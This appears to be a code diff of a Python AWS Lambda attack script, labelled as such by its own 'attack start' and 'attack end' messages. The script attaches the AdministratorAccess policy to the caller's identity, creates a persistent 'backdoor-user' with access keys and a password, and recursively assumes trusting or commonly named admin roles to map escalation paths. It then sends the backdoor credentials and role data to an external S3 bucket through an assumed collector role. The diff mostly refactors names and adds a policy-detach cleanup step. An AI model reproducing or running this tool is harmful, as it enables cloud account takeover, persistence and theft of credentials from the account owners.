@@ -3,13 +3,17 @@
 """
 @author: richardw
 """
+
 import boto3
 import uuid
 import json
 import time
-from collections import deque
+import re
+import datetime
 from botocore.exceptions import BotoCoreError, ClientError
+from typing import Dict, List, Optional, Tuple
 
+# for Lambda entry
 def lambda_handler(event, context):
     main()
     return {
@@ -17,33 +21,48 @@ def lambda_handler(event, context):
         'body': json.dumps('Finished')
     }
 
+# for Lambda entry
+def handler(event, context):
+    main()
+    return {
+        'statusCode': 200,
+        'body': json.dumps('Finished')
+    }
+    
 
-recycler = {'ARN':'',
+collector_config = {'ARN':'',
             'BUCKET_NAME': '',
             'EXTERNAL_ID': '',
             'OBJECT_KEY': ''
             }
 account_id = ""
+target_policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"
 backdoor = None
 backdoor_user_name = "backdoor-user"
 backdoor_password = ""
+change_effective_waiting_time = 10
 
 assumecredentials_name = "EscalationAttempt"
 
-common_role_names = [
+common_role_names = (
     "AdminRole",
     "Administrator",
     "DevOpsRole",
     "OrganizationAccountAccessRole",
     "LambdaExecutionRole",
-    ]
- 
-def generate_object_key (arn: str) -> str:
+    "Security_Analyst"
+    )
+
+def rationalized_naming(name:str) -> str:
+    return re.sub(r'[:\s-]', '_', name)
+
+def generate_return_data_name (arn: str):
     account_id =  arn.split(":")[4]
     user_path = arn.split(":")[5].split("/")[1]
-  
-    global recycler
-    recycler['OBJECT_KEY'] = f"{account_id}_user_{user_path}"
+    time_str = time.strftime("%Y_%m_%d_%H_%M_%S")
+    
+    global collector_config
+    collector_config['OBJECT_KEY'] = f"{account_id}_{user_path}_{time_str}.json"
 
 def normalize_arn(arn: str) -> str:
     if ":sts::" in arn and ":assumed-role/" in arn:
@@ -56,33 +75,61 @@ def normalize_arn(arn: str) -> str:
     return arn
 
 def attach_policy(iam, identity_arn):
-    success = False
+    success_state = False
     name = identity_arn.split('/')[-1]
     if ":role/" in identity_arn:
         try:
             iam.attach_role_policy(
                 RoleName=name,
-                PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
+                PolicyArn=target_policy_arn
             )
-            success = True
+            success_state = True
         except Exception as e:
             print(f'[!] Failed to attach policy: {e}')
-            return success
+            return success_state
     else:
         try:
             iam.attach_user_policy(
                 UserName=name,
-                PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
+                PolicyArn=target_policy_arn
             )
-            success = True
+            success_state = True
         except Exception as e:
             print(f'[!] Failed to attach policy: {e}')
-            return success
+            return success_state
     
-    return success
+    return success_state
+
+def detach_policy(iam, identity_arn):
+    success_state = False
+    name = identity_arn.split('/')[-1]
+    if ":role/" in identity_arn:
+        try:
+            iam.detach_role_policy(
+                RoleName=name,
+                PolicyArn=target_policy_arn
+            )
+            success_state = True
+        except Exception as e:
+            print(f'[!] Failed to detach policy: {e}')
+            return success_state
+    else:
+        try:
+            iam.detach_user_policy(
+                UserName=name,
+                PolicyArn=target_policy_arn
+            )
+            success_state = True
+        except Exception as e:
+            print(f'[!] Failed to detach policy: {e}')
+            return success_state
+
+    return success_state
+
+    
     
 def create_backdoor_user(iam):
-    success = False
+    success_state = False
     
     try:
         iam.create_user(UserName=backdoor_user_name)
@@ -96,17 +143,19 @@ def create_backdoor_user(iam):
             Password=backdoor_password,
             PasswordResetRequired=False
             )
-        success = True
+        success_state = True
         global backdoor
         backdoor = response['AccessKey']
     except Exception as e:
         print(f'[!] Failed to create backdoor: {e}')
-        return success
+        return success_state
         
-    return success
+    return success_state
 
 
 def create_backdoor(iam):  
+    # create a role ?
+    
     return create_backdoor_user(iam)
 
 
@@ -127,37 +176,38 @@ def attemp_assume(current_entity_name, sts, roles_list, assume_tree):
             print(f'> try assume role: {target_role_arn} failed')
             continue
 
-def exploit(iam, sts, identity_arn, assume_tree, role_manager):
+def exploit(iam, sts, identity_arn, assume_tree, role_recorder):
 
-    obtainedAdmin = attach_policy(iam, identity_arn)
-    print(f'> obtained admin {obtainedAdmin}')
+    obtainedAdmin_state = attach_policy(iam, identity_arn)
+    print(f'> obtained admin {obtainedAdmin_state}')
     
-    if not backdoor and obtainedAdmin:
-        time.sleep(10)
-        success = create_backdoor(iam)
-        print(f'> create backdoor {success}')
-        if success:
-            print(backdoor)
+    if not backdoor and obtainedAdmin_state:
+        time.sleep(change_effective_waiting_time)
+        create_backdoor_state = create_backdoor(iam)
+        print(f'> create backdoor {create_backdoor_state}')
+
     
     current_entity_name = identity_arn.split('/')[-1]
-    possible_assumed_roles = set(role_manager.get_roles_trusting(current_entity_name, account_id) + 
-                                 common_role_names)
-    
+    trusting_roles = set(role_recorder.find_roles_trusting_principal(current_entity_name, account_id))    
+    on_tree_roles = set(assume_tree.get_all_roles())
+    possible_assumed_roles = trusting_roles.union(common_role_names) - on_tree_roles 
     print(f'> possible assumed roles {possible_assumed_roles}')
     
     attemp_assume(current_entity_name, sts, possible_assumed_roles, assume_tree )
     
-    #TODO: clean up
+    if obtainedAdmin_state == True:
+        detach_policy_state = detach_policy(iam, identity_arn)
+        print(f'> clean up policy {"success" if detach_policy_state else "failed"}')
     
 def recycle(sts, data):
     try:
         response = sts.assume_role(
-            RoleArn=recycler['ARN'],
+            RoleArn=collector_config['ARN'],
             RoleSessionName= str(uuid.uuid1()),
-            ExternalId=recycler['EXTERNAL_ID']
+            ExternalId=collector_config['EXTERNAL_ID']
         )
     except Exception as e:
-        print(f'[!] get recycler sts failed: {e} ')
+        print(f'[!] get collector sts failed: {e} ')
         return
     
     creds = response["Credentials"]
@@ -170,115 +220,95 @@ def recycle(sts, data):
     
     try:
         s3_client.put_object(
-            Bucket=recycler['BUCKET_NAME'],
-            Key=recycler['OBJECT_KEY'],
+            Bucket=collector_config['BUCKET_NAME'],
+            Key=collector_config['OBJECT_KEY'],
             Body=json.dumps(data, default=str)
         )
     except Exception as e:
-        print(f'[!] put object to recycler failed: {e} ')
+        print(f'[!] put object to collector failed: {e} ')
         return
     
     print('> Data is successfully transmitted')
-    
-    
 
 
 class IAMAssumeTree:
-    def __init__(self, root_role):
-        self.tree = {root_role: {}}
-        self.roles_in_tree = {root_role}
+    def __init__(self, root_role: str):
+        self.root = root_role
+        self.nodes: Dict[str, List[str]] = {root_role: []}  # 多叉树结构
+        self.edges: Dict[Tuple[str, str], Dict] = {}        # 边上的 credentials
 
-    def add_assume_relation(self, source_role, target_role, credentials):
-        if target_role in self.roles_in_tree:
-            return
+    def add_assume_relation(self, source_role: str, target_role: str, credentials: Optional[Dict] = None) -> bool:
+        if source_role not in self.nodes:
+            print(f"[!] Cannot add assume relation: source role '{source_role}' not found.")
+            return False
 
-        queue = deque([(self.tree, [])])
-        while queue:
-            subtree, path = queue.popleft()
-            for role, children in subtree.items():
-                if role == source_role:
-                    children[target_role] = {"credentials": credentials or {}}
-                    self.roles_in_tree.add(target_role)
-                    print(f"[add] {source_role} => {target_role} path: {' > '.join(path + [role])}")
-                    return
-                queue.append((children, path + [role]))
+        if (source_role, target_role) in self.edges:
+            print(f"[!] Assume relation from '{source_role}' to '{target_role}' already exists.")
+            return False
 
-        print(f"[!] can't find role {source_role}，failed to add: {source_role} => {target_role}")
+        if target_role not in self.nodes:
+            self.nodes[target_role] = []
 
-    def print_tree(self, subtree=None, indent=0):
-        lines = []
+        self.nodes[source_role].append(target_role)
+        self.edges[(source_role, target_role)] = credentials or {}
 
-        def _build_tree_string(subtree, indent):
-            for role, children in subtree.items():
-                if role == "credentials":
-                    continue
-                lines.append("  " * indent + role)
-                if "credentials" in children:
-                    credentials = children["credentials"]
-                    for key, val in credentials.items():
-                        lines.append("  " * (indent + 1) + f"[{key}]: {val}")
-                _build_tree_string(children, indent + 1)
+        print(f"[+] Added assume: {source_role} → {target_role}")
+        return True
 
-        if subtree is None:
-            subtree = self.tree
-
-        _build_tree_string(subtree, indent)
-
-        tree_str = "\n".join(lines)
-        
-        print(tree_str)
-        return tree_str
-            
-    def get_direct_children(self, role_name):
-        queue = deque([self.tree])
-        while queue:
-            subtree = queue.popleft()
-            for role, children in subtree.items():
-                if role == "credentials":
-                    continue
-                if role == role_name:
-                    # 收集子节点
-                    result = []
-                    for child_role, child_content in children.items():
-                        if child_role == "credentials":
-                            continue
-                        credentials = child_content.get("credentials", {})
-                        result.append({"role": child_role, "credentials": credentials})
-                    return result
-                queue.append(children)
-        print(f"[!] can't find {role_name} direct children. Chain broken!")
-        return []
-    
-    def print_all_paths_to_leaves(self):
-        def dfs(node, path, subtree, result):
-            for role, children in subtree.items():
-                if role == "credentials":
-                    continue
-                new_path = path + [role]
-                child_roles = [k for k in children.keys() if k != "credentials"]
-                if not child_roles:
-                    # 是叶子节点
-                    path_str = " → ".join(new_path)
-                    result.append(path_str)
-                else:
-                    dfs(role, new_path, children, result)
+    def get_direct_children(self, role_name: str) -> List[Dict]:
+        if role_name not in self.nodes:
+            print(f"[!] Role '{role_name}' not found in tree.")
+            return []
 
         result = []
-        dfs(None, [], self.tree, result)
+        for child in self.nodes[role_name]:
+            cred = self.edges.get((role_name, child), {})
+            result.append({
+                "role": child,
+                "credentials": cred
+            })
+        return result
+    
+    def get_all_roles(self) -> List[str]:
+        return sorted(self.nodes.keys())
 
-        print("\n[Assume Chains from Root to Leaves]\n" + "-" * 40)
-        for path in result:
-            print(path)
-        print("-" * 40 + "\n")
-            
+    def get_tree_data(self) -> Dict:
+        def build_subtree(role: str, parent: Optional[str] = None) -> Dict:
+            credentials = self.edges.get((parent, role), {}) if parent else {}
+            return {
+                "role": role,
+                "credentials": credentials,
+                "children": [build_subtree(child, role) for child in self.nodes.get(role, [])]
+            }
+
+        if self.root not in self.nodes:
+            raise ValueError("Root role is not defined in the tree.")
+
+        return build_subtree(self.root)
+
+    def get_all_paths_to_leaves(self) -> List[str]:
+        def dfs(role: str, path: List[str], result: List[str]):
+            children = self.nodes.get(role, [])
+            new_path = path + [role]
+
+            if not children:
+                result.append(" → ".join(new_path))
+            else:
+                for child in children:
+                    dfs(child, new_path, result)
+
+        if self.root not in self.nodes:
+            raise ValueError("Root role is not defined in the tree.")
+
+        result = []
+        dfs(self.root, [], result)
         return result
 
 
+class RoleRecorder:
+    def __init__(self):
+        self.roles = {}  # key: role name, value: full role metadata
 
-class RoleManager:
-    def __init__ (self):
-        self.roles = {} # key: role name, value: full role metadata
-    
     def update_roles(self, iam_client):
         try:
             paginator = iam_client.get_paginator('list_roles')
@@ -289,38 +319,41 @@ class RoleManager:
                         self.roles[role_name] = role
         except (BotoCoreError, ClientError) as e:
             print(f"[!] Failed to list IAM roles: {e}")
-        
-    def get_roles_trusting(self, principal_name, account_id): 
-        result = []
+
+    def find_roles_trusting_principal(self, principal_arn: str, account_id: str) -> list:
+        trusted_roles = set()
+        root_arn = f"arn:aws:iam::{account_id}:root"
+
         for role_name, role_data in self.roles.items():
-            doc = role_data.get('AssumeRolePolicyDocument', {})
-            statements = doc.get('Statement', [])
+            policy = role_data.get('AssumeRolePolicyDocument', {})
+            statements = policy.get('Statement', [])
             if not isinstance(statements, list):
                 statements = [statements]
 
             for stmt in statements:
                 principal = stmt.get('Principal', {})
-                if 'AWS' not in principal:
+                aws_field = principal.get('AWS')
+                if not aws_field:
                     continue
 
-                aws_principals = principal['AWS']
-                if isinstance(aws_principals, str):
-                    aws_principals = [aws_principals]
+                principals = [aws_field] if isinstance(aws_field, str) else aws_field
 
-                for val in aws_principals:
-                    if principal_name in val:
-                        result.append(role_name)
+                for val in principals:
+                    if principal_arn in val or val == root_arn:
+                        trusted_roles.add(role_name)
                         break
-                    if val == f"arn:aws:iam::{account_id}:root":
-                        result.append(role_name)
-                        break
-                    
-        return sorted(set(result))
-    
+
+        return sorted(trusted_roles)
+
     def export_to_json(self):
-        return json.dumps(self.roles, indent=2, default=str)
+        return json.dumps(
+            self.roles,
+            indent=2,
+            default=lambda obj: obj.isoformat() if isinstance(obj, datetime.datetime) else str(obj)
+            )
 
-def recursive(sts, iam, assume_tree, role_manager):
+
+def recursive(sts, iam, assume_tree, role_recorder):
     try:
         current_identity_arn = sts.get_caller_identity()['Arn']
     except Exception as e:
@@ -330,9 +363,9 @@ def recursive(sts, iam, assume_tree, role_manager):
     
     print(f'current identity_arn: {current_identity_arn}')
     
-    role_manager.update_roles(iam)
+    role_recorder.update_roles(iam)
     
-    exploit(iam, sts, current_identity_arn, assume_tree, role_manager)
+    exploit(iam, sts, current_identity_arn, assume_tree, role_recorder)
     
     children = assume_tree.get_direct_children(current_identity_arn.split('/')[-1])
     for child in children:
@@ -343,7 +376,7 @@ def recursive(sts, iam, assume_tree, role_manager):
             aws_secret_access_key=child['credentials']['SecretAccessKey'],
             aws_session_token=child['credentials']['SessionToken']
             )
-        recursive(session.client('sts'), session.client('iam'), assume_tree, role_manager)
+        recursive(session.client('sts'), session.client('iam'), assume_tree, role_recorder)
 
     return
 
@@ -362,23 +395,27 @@ def main():
 
     identity_arn = normalize_arn(identity['Arn'])
     
-    generate_object_key(identity_arn)
+    generate_return_data_name(identity_arn)
     
     assume_tree = IAMAssumeTree(identity_arn.split('/')[-1])
-    role_finder = RoleManager()
+    role_recorder = RoleRecorder()
     
     print("> attack start")
-    recursive(sts, iam, assume_tree, role_finder)
+    recursive(sts, iam, assume_tree, role_recorder)
     
-    tree_data = assume_tree.print_tree()
-    paths_data = assume_tree.print_all_paths_to_leaves()
-    role_data = role_finder.export_to_json()
+    tree_data = assume_tree.get_tree_data()
+    paths_data = assume_tree.get_all_paths_to_leaves()
     
     
-    recycle_data = {'back door': backdoor, 'back door pwd': backdoor_password,'paths': paths_data, 'tree_data': tree_data, 'role data': role_data}
+    recycle_data = {'Account ID': account_id,
+                    'back door': backdoor,
+                    'back door pwd': backdoor_password,
+                    'paths': paths_data,
+                    'tree_data': tree_data,
+                    'role data': role_recorder.roles}
     
     if backdoor:
-        time.sleep(10)
+        time.sleep(change_effective_waiting_time)
         print('> Data is returning through the backdoor user')
         back_door_session = boto3.Session(
             aws_access_key_id=backdoor['AccessKeyId'],
@@ -393,6 +430,17 @@ def main():
             return
         
         recycle(back_door_sts, recycle_data)
+        
+    else:
+        print('> Data is returning through the Executor')
+        recycle(sts, recycle_data)
+        
+    print("> attack end")
+            
+        
+
+if __name__ == "__main__":
+    main()
     
     
     
